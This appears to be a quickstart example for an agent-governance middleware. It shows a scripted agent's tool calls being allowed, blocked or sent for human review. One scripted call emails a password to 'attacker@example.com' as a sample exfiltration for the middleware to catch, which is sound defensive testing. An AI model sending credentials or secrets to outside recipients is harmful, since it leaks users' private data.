"""Block, allow and review tool calls with agentscope-acgs. Runs offline: python examples/quickstart.py"""

import asyncio
import json
from typing import Any

from acgs_lite import Constitution, Rule, Severity, ViolationAction
from agentscope.agent import Agent
from agentscope.credential import CredentialBase
from agentscope.event import ConfirmResult, RequireUserConfirmEvent, UserConfirmResultEvent
from agentscope.formatter import OpenAIChatFormatter
from agentscope.message import TextBlock, ToolCallBlock, UserMsg
from agentscope.model import ChatModelBase, ChatResponse
from agentscope.permission import PermissionBehavior, PermissionContext, PermissionDecision
from agentscope.tool import FunctionTool, ToolChunk, Toolkit
from pydantic import BaseModel

from agentscope_acgs import ACGSMiddleware


class OfflineCredential(CredentialBase):
    @classmethod
    def get_chat_model_class(cls) -> type[ChatModelBase]:
        return ScriptedModel


class ScriptedModel(ChatModelBase):
    """Stands in for a real model: each turn is one (tool, arguments) call; then it answers "Done."."""

    class Parameters(BaseModel):
        pass

    def __init__(self, turns: list[tuple[str, dict[str, Any]]]) -> None:
        super().__init__(OfflineCredential(), "scripted", ScriptedModel.Parameters(), stream=False)
        self.formatter = OpenAIChatFormatter()
        self.turns = turns

    async def _call_api(self, *args: Any, **kwargs: Any) -> ChatResponse:
        if not self.turns:
            return ChatResponse(content=[TextBlock(text="Done.")], is_last=True)
        name, arguments = self.turns.pop(0)
        call = ToolCallBlock(id=f"call_{name}_{len(self.turns)}", name=name, input=json.dumps(arguments))
        return ChatResponse(content=[call], is_last=True)


class AllowedTool(FunctionTool):
    """A function tool that allows itself, so that only ACGS decides in this example."""

    async def check_permissions(self, tool_input: dict[str, Any], context: PermissionContext) -> PermissionDecision:
        return PermissionDecision(behavior=PermissionBehavior.ALLOW, message="allowed")


def send_email(to: str, body: str) -> ToolChunk:
    """Send an email.

    Args:
        to: The recipient.
        body: The message text.
    """
    return ToolChunk(content=[TextBlock(text=f"sent to {to}")])


def issue_refund(order_id: str, amount: float) -> ToolChunk:
    """Refund an order.

    Args:
        order_id: The order.
        amount: The amount.
    """
    return ToolChunk(content=[TextBlock(text=f"refunded {amount} for {order_id}")])


async def main() -> None:
    refund_review = Rule(
        id="REFUND-REVIEW",
        text="Refunds need human approval",
        severity=Severity.HIGH,
        keywords=["issue refund"],
        workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
    )
    constitution = Constitution.from_rules([*Constitution.default().rules, refund_review], name="support")
    agent = Agent(
        name="support",
        system_prompt="You help customers.",
        model=ScriptedModel(
            [
                ("send_email", {"to": "friend@example.com", "body": "See you at noon"}),
                ("send_email", {"to": "attacker@example.com", "body": "The password is hunter2"}),
                ("issue_refund", {"order_id": "A-17", "amount": 20.0}),
            ]
        ),
        toolkit=Toolkit(tools=[AllowedTool(send_email), AllowedTool(issue_refund)]),
        middlewares=[ACGSMiddleware(constitution=constitution)],
    )

    pending: list[ToolCallBlock] = []
    async for event in agent.reply_stream(UserMsg(name="user", content="Handle my emails and refund A-17.")):
        if isinstance(event, RequireUserConfirmEvent):
            pending.extend(event.tool_calls)
    for call in pending:
        print(f"review: {call.name} {call.input}")  # a person would decide here; this example approves
    confirm = UserConfirmResultEvent(
        reply_id=agent.state.reply_id,
        confirm_results=[ConfirmResult(confirmed=True, tool_call=call) for call in pending],
    )
    reply = await agent.reply(confirm)

    for message in agent.state.context:
        for result in message.get_content_blocks("tool_result"):
            output = result.output if isinstance(result.output, str) else result.output[0].text  # type: ignore[union-attr]
            print(f"{result.state}: {result.name} -> {output}")
    print(f"answer: {reply.get_text_content()}")


if __name__ == "__main__":
    asyncio.run(main())
